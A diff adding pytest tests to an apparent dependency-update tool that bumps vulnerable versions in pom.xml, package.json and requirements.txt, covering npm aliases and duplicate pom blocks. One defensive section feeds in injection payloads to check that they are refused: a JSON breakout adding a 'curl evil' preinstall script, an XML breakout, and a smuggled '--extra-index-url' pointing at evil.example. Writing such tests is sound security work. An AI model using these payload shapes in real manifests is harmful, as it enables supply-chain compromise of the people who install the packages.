@@ -23,6 +23,7 @@ def _vuln_row(
     advisory_id: str = "GHSA-x",
     pin_style: str = "exact",
     aliases: list[str] | None = None,
+    alias_name: str | None = None,
 ) -> dict:
     return {
         "id": f"sca:vuln:{ecosystem}:{name}:{version}:{advisory_id}",
@@ -36,6 +37,7 @@ def _vuln_row(
         "sca": {
             "ecosystem": ecosystem,
             "name": name,
+            "alias_name": alias_name,
             "version": version,
             "purl": f"pkg:{ecosystem.lower()}/{name}@{version}",
             "pin_style": pin_style,
@@ -985,6 +987,63 @@ def test_pom_block_scan_targets_matching_block_only() -> None:
     assert "<version>2.14.1</version>" in plugin_block
 
 
+def test_pom_duplicate_dependency_blocks_all_bumped() -> None:
+    """A pom legitimately declares the same groupId:artifactId in
+    several blocks (<dependencyManagement> + <dependencies>,
+    per-profile overrides). EVERY block still at the installed
+    version must be bumped — stopping at the first left the twin on
+    the vulnerable version while the run reported applied."""
+    pom = """\
+<project>
+  <dependencyManagement><dependencies>
+    <dependency>
+      <groupId>org.apache.logging.log4j</groupId>
+      <artifactId>log4j-core</artifactId>
+      <version>2.14.1</version>
+    </dependency>
+  </dependencies></dependencyManagement>
+  <dependencies>
+    <dependency>
+      <groupId>org.apache.logging.log4j</groupId>
+      <artifactId>log4j-core</artifactId>
+      <version>2.14.1</version>
+    </dependency>
+  </dependencies>
+</project>
+"""
+    text, applied, _reason = update._rewrite_pom_xml(pom, _pom_plan())
+    assert applied is True
+    assert text.count("<version>2.17.1</version>") == 2
+    assert "<version>2.14.1</version>" not in text
+
+
+def test_pom_property_ref_in_any_matching_block_refuses_all() -> None:
+    """When any matching block resolves its version via ``${...}``,
+    the whole edit is refused (original text back) regardless of
+    block order — rewriting only the literal twin while the property
+    decides the effective version elsewhere would half-edit the pom."""
+    pom = """\
+<project>
+  <dependencies>
+    <dependency>
+      <groupId>org.apache.logging.log4j</groupId>
+      <artifactId>log4j-core</artifactId>
+      <version>2.14.1</version>
+    </dependency>
+    <dependency>
+      <groupId>org.apache.logging.log4j</groupId>
+      <artifactId>log4j-core</artifactId>
+      <version>${log4j.version}</version>
+    </dependency>
+  </dependencies>
+</project>
+"""
+    text, applied, reason = update._rewrite_pom_xml(pom, _pom_plan())
+    assert applied is False
+    assert text == pom
+    assert reason is not None and "property reference" in reason
+
+
 def test_pom_target_written_verbatim() -> None:
     """The replacement is a callable, not a template — backslash
     sequences in the target version must land verbatim rather than
@@ -1196,3 +1255,297 @@ def test_requirements_txt_spaced_extras_and_operator_rewritten(
     # Spaced operator + trailing environment marker both survive.
     assert 'flask==2.3.3 ; python_version >= "3.8"' in body
     assert "2.3.0" not in body
+
+
+# ---------------------------------------------------------------------------
+# npm-alias fix-materialisation — the rewrite anchors on the ALIAS key
+# and writes the ``npm:<real>@…`` spelling back
+# ---------------------------------------------------------------------------
+
+def test_bump_npm_spec_alias_preserves_alias_spelling() -> None:
+    assert update._bump_npm_spec(
+        "npm:lodash@^4.17.0", "4.17.4", "4.17.21",
+    ) == "npm:lodash@^4.17.21"
+    assert update._bump_npm_spec(
+        "npm:@scope/real@~1.2.0", "1.2.1", "1.2.3",
+    ) == "npm:@scope/real@~1.2.3"
+    # No range after the target → pin the target version.
+    assert update._bump_npm_spec(
+        "npm:lodash", "4.17.4", "4.17.21",
+    ) == "npm:lodash@4.17.21"
+    # Bare protocol form (range, no package name) → manual review.
+    assert update._bump_npm_spec("npm:^1.0.0", "1.0.1", "1.0.5") is None
+
+
+def test_rewrite_package_json_aliased_dep(tmp_path: Path) -> None:
+    from packages.sca.update import _PlanEntry, _rewrite_package_json
+    text = json.dumps({
+        "dependencies": {"my-lodash": "npm:lodash@^4.17.0"},
+    }, indent=2)
+    plan = _PlanEntry(ecosystem="npm", name="lodash",
+                      installed="4.17.4", target="4.17.21",
+                      manifest=Path("package.json"), advisory_ids=[],
+                      alias_name="my-lodash")
+    new_text, applied, reason = _rewrite_package_json(text, plan)
+    assert applied is True, reason
+    # The alias key and the npm:<real>@ spelling both survive.
+    assert '"my-lodash": "npm:lodash@^4.17.21"' in new_text
+    assert "4.17.0" not in new_text
+
+
+def test_rewrite_package_json_alias_plan_falls_back_to_plain_key(
+    tmp_path: Path,
+) -> None:
+    # The plan carries an alias but this manifest declares the package
+    # un-aliased (both spellings exist in the project) — the plain key
+    # still rewrites.
+    from packages.sca.update import _PlanEntry, _rewrite_package_json
+    text = json.dumps({
+        "dependencies": {"lodash": "^4.17.0"},
+    }, indent=2)
+    plan = _PlanEntry(ecosystem="npm", name="lodash",
+                      installed="4.17.4", target="4.17.21",
+                      manifest=Path("package.json"), advisory_ids=[],
+                      alias_name="my-lodash")
+    new_text, applied, reason = _rewrite_package_json(text, plan)
+    assert applied is True, reason
+    assert '"lodash": "^4.17.21"' in new_text
+
+
+def test_update_main_materialises_alias_rewrite(tmp_path: Path) -> None:
+    manifest = tmp_path / "package.json"
+    manifest.write_text(json.dumps({
+        "dependencies": {"my-lodash": "npm:lodash@^4.17.0"},
+    }, indent=2), encoding="utf-8")
+    findings = _findings_file(tmp_path, [
+        _vuln_row(ecosystem="npm", name="lodash",
+                  version="4.17.4", fixed_version="4.17.21",
+                  manifest=manifest, alias_name="my-lodash"),
+    ])
+    out = tmp_path / "out"
+    update.main(["--findings", str(findings), "--out", str(out),
+                 "--offline"])
+    proposed = next(iter((out / "proposed").rglob("package.json")))
+    body = proposed.read_text()
+    assert '"my-lodash": "npm:lodash@^4.17.21"' in body
+    assert "4.17.0" not in body
+    # The installed package's name never appears as a manifest key.
+    assert '"lodash":' not in body
+
+
+def test_rewrite_package_json_alias_and_plain_both_bumped(
+    tmp_path: Path,
+) -> None:
+    # One manifest declares the package BOTH aliased and plain — the
+    # single plan (keyed on the installed package) must fix both
+    # spellings, or one declaration stays on the vulnerable range
+    # while the change reports applied.
+    from packages.sca.update import _PlanEntry, _rewrite_package_json
+    text = json.dumps({
+        "dependencies": {
+            "my-lodash": "npm:lodash@^4.17.0",
+            "lodash": "^4.17.0",
+        },
+    }, indent=2)
+    plan = _PlanEntry(ecosystem="npm", name="lodash",
+                      installed="4.17.4", target="4.17.21",
+                      manifest=Path("package.json"), advisory_ids=[],
+                      alias_name="my-lodash")
+    new_text, applied, reason = _rewrite_package_json(text, plan)
+    assert applied is True, reason
+    obj = json.loads(new_text)
+    assert obj["dependencies"]["my-lodash"] == "npm:lodash@^4.17.21"
+    assert obj["dependencies"]["lodash"] == "^4.17.21"
+
+
+def test_rewrite_package_json_never_writes_into_a_different_alias_target(
+    tmp_path: Path,
+) -> None:
+    # A key equal to plan.name that aliases a DIFFERENT package
+    # ("lodash": "npm:left-pad@^1") must never receive the plan's fix
+    # version — and the genuinely vulnerable plain declaration in the
+    # other section must still be found and bumped.
+    from packages.sca.update import _PlanEntry, _rewrite_package_json
+    text = json.dumps({
+        "dependencies": {"lodash": "npm:left-pad@^1.0.0"},
+        "devDependencies": {"lodash": "^4.17.0"},
+    }, indent=2)
+    plan = _PlanEntry(ecosystem="npm", name="lodash",
+                      installed="4.17.4", target="4.17.21",
+                      manifest=Path("package.json"), advisory_ids=[])
+    new_text, applied, reason = _rewrite_package_json(text, plan)
+    assert applied is True, reason
+    obj = json.loads(new_text)
+    assert obj["dependencies"]["lodash"] == "npm:left-pad@^1.0.0"
+    assert obj["devDependencies"]["lodash"] == "^4.17.21"
+
+
+def test_rewrite_package_json_alias_key_with_plain_spec_not_touched(
+    tmp_path: Path,
+) -> None:
+    # The plan's alias spelling collides with a REAL package of that
+    # name declared plainly — that's a different dep, not an aliased
+    # install of the plan's package.
+    from packages.sca.update import _PlanEntry, _rewrite_package_json
+    text = json.dumps({
+        "dependencies": {"my-lodash": "^1.0.0"},
+    }, indent=2)
+    plan = _PlanEntry(ecosystem="npm", name="lodash",
+                      installed="4.17.4", target="4.17.21",
+                      manifest=Path("package.json"), advisory_ids=[],
+                      alias_name="my-lodash")
+    new_text, applied, reason = _rewrite_package_json(text, plan)
+    assert applied is False
+    assert new_text == text
+    assert reason == "no matching spec found"
+
+
+def test_rewrite_package_json_case_sibling_alias_not_bumped(
+    tmp_path: Path,
+) -> None:
+    # Legacy case-colliding npm names are distinct packages
+    # (JSONStream vs jsonstream) — a plan for the lowercase one must
+    # not write into an alias targeting its case-sibling.
+    from packages.sca.update import _PlanEntry, _rewrite_package_json
+    text = json.dumps({
+        "dependencies": {"jsonstream": "npm:JSONStream@^1.0.0"},
+    }, indent=2)
+    plan = _PlanEntry(ecosystem="npm", name="jsonstream",
+                      installed="1.0.0", target="1.3.5",
+                      manifest=Path("package.json"), advisory_ids=[])
+    new_text, applied, reason = _rewrite_package_json(text, plan)
+    assert applied is False
+    assert new_text == text
+    assert reason == "no matching spec found"
+
+
+# ---------------------------------------------------------------------------
+# Untrusted fix-version grammar gate — local-rewriter chokepoint
+# ---------------------------------------------------------------------------
+
+def _hostile_plan(manifest: str, ecosystem: str, name: str,
+                  installed: str, target: str) -> update._PlanEntry:
+    return update._PlanEntry(
+        ecosystem=ecosystem, name=name, installed=installed,
+        target=target, manifest=Path(manifest), advisory_ids=["GHSA-x"],
+    )
+
+
+def test_hostile_target_refused_for_package_json() -> None:
+    """A fixed_version carrying a JSON-string breakout must never be
+    spliced between package.json quotes (install-script injection)."""
+    payload = '4.17.21", "scripts": {"preinstall": "curl evil"'
+    text = json.dumps({"dependencies": {"lodash": "^4.17.19"}}, indent=2)
+    plan = _hostile_plan("package.json", "npm", "lodash",
+                         "4.17.19", payload)
+    new_text, applied, reason = update._rewrite_one(
+        Path("package.json"), text, plan)
+    assert applied is False
+    assert new_text == text
+    assert "preinstall" not in new_text
+    assert reason is not None and reason.startswith("refused")
+    # The refusal reason is rendered into operator markdown/stdout —
+    # it must carry no raw newline or unescaped backtick/pipe.
+    assert "\n" not in reason
+
+
+def test_hostile_target_refused_for_pom_xml() -> None:
+    payload = "2.17.1</version></dependency><dependency>evil"
+    text = (
+        "<project><dependencies><dependency>"
+        "<groupId>org.apache.logging.log4j</groupId>"
+        "<artifactId>log4j-core</artifactId>"
+        "<version>2.14.1</version>"
+        "</dependency></dependencies></project>"
+    )
+    plan = _hostile_plan(
+        "pom.xml", "Maven", "org.apache.logging.log4j:log4j-core",
+        "2.14.1", payload)
+    new_text, applied, reason = update._rewrite_one(
+        Path("pom.xml"), text, plan)
+    assert applied is False
+    assert new_text == text
+    assert "</version></dependency>" not in payload or "evil" not in new_text
+    assert reason is not None and reason.startswith("refused")
+
+
+def test_hostile_target_refused_for_requirements_txt() -> None:
+    payload = "2.28.0\n--extra-index-url https://evil.example/simple"
+    text = "requests==2.27.0\n"
+    plan = _hostile_plan("requirements.txt", "PyPI", "requests",
+                         "2.27.0", payload)
+    new_text, applied, reason = update._rewrite_one(
+        Path("requirements.txt"), text, plan)
+    assert applied is False
+    assert new_text == text
+    assert "--extra-index-url" not in new_text
+    assert reason is not None and reason.startswith("refused")
+
+
+def test_plain_version_targets_still_rewrite() -> None:
+    """Positive direction: the gate admits ordinary version literals
+    (including build metadata / pre-release shapes)."""
+    text = json.dumps({"dependencies": {"lodash": "^4.17.19"}}, indent=2)
+    plan = _hostile_plan("package.json", "npm", "lodash",
+                         "4.17.19", "4.17.21")
+    new_text, applied, reason = update._rewrite_one(
+        Path("package.json"), text, plan)
+    assert applied is True and "^4.17.21" in new_text
+    req = "requests==2.27.0\n"
+    plan2 = _hostile_plan("requirements.txt", "PyPI", "requests",
+                          "2.27.0", "2.28.0rc1")
+    new_req, applied2, _ = update._rewrite_one(
+        Path("requirements.txt"), req, plan2)
+    assert applied2 is True and "2.28.0rc1" in new_req
+
+
+def test_optimise_bare_pin_refuses_hostile_target() -> None:
+    """The bare-name pin fallback is the one rewrite entry point not
+    routed through _rewrite_one — it must apply the same gate (it runs
+    exactly when _rewrite_one declined, including gate declines)."""
+    from packages.sca import optimise
+    payload = '1.0.0", "scripts": {"preinstall": "curl evil"'
+    text = json.dumps({"dependencies": {"left-pad": "*"}}, indent=2)
+    plan = _hostile_plan("package.json", "npm", "left-pad",
+                         "1.0.0", payload)
+    new_text, applied, reason = optimise._pin_bare_name(
+        Path("package.json"), text, plan)
+    assert applied is False
+    assert new_text == text
+    assert reason is not None and reason.startswith("refused")
+
+
+def test_dpkg_epoch_and_tilde_targets_pass_gate() -> None:
+    """Debian epoch (``4:12.2.0-3``) and tilde (``1.0~rc1``) versions
+    are legitimate upgrade targets — the gate must admit them while
+    still refusing splice shapes that merely CONTAIN a colon."""
+    plan = _hostile_plan("requirements.txt", "Debian", "nginx",
+                         "1.22.1-9", "4:12.2.0-3")
+    assert update.refuse_unsafe_target(plan) is None
+    plan_tilde = _hostile_plan("requirements.txt", "Debian", "nginx",
+                               "1.22.1-9", "1.0~rc1+deb12u1")
+    assert update.refuse_unsafe_target(plan_tilde) is None
+    for bad in ('4:12","scripts":{}', "4:12\n--evil", "4:12 <x>", ":leading"):
+        p = _hostile_plan("requirements.txt", "Debian", "nginx",
+                          "1.22.1-9", bad)
+        assert update.refuse_unsafe_target(p) is not None
+
+
+def test_change_key_folds_case_only_where_the_registry_does() -> None:
+    """PyPI names are case-insensitive (PEP 503) so folding is
+    correct there; npm names are case-SENSITIVE, and lowercasing made
+    case-distinct packages share one compat report — the package.json
+    rewriter explicitly refuses that conflation."""
+    from packages.sca.update import UpgradeChange, _change_key
+
+    def _chg(eco: str, name: str) -> UpgradeChange:
+        return UpgradeChange(
+            ecosystem=eco, name=name, manifest=Path("/m"),
+            old_version="1.0", new_version="2.0",
+            advisory_ids=("GHSA-x",),
+        )
+
+    assert (_change_key(_chg("npm", "JSONStream"))
+            != _change_key(_chg("npm", "jsonstream")))
+    assert (_change_key(_chg("PyPI", "Django"))
+            == _change_key(_chg("PyPI", "django")))
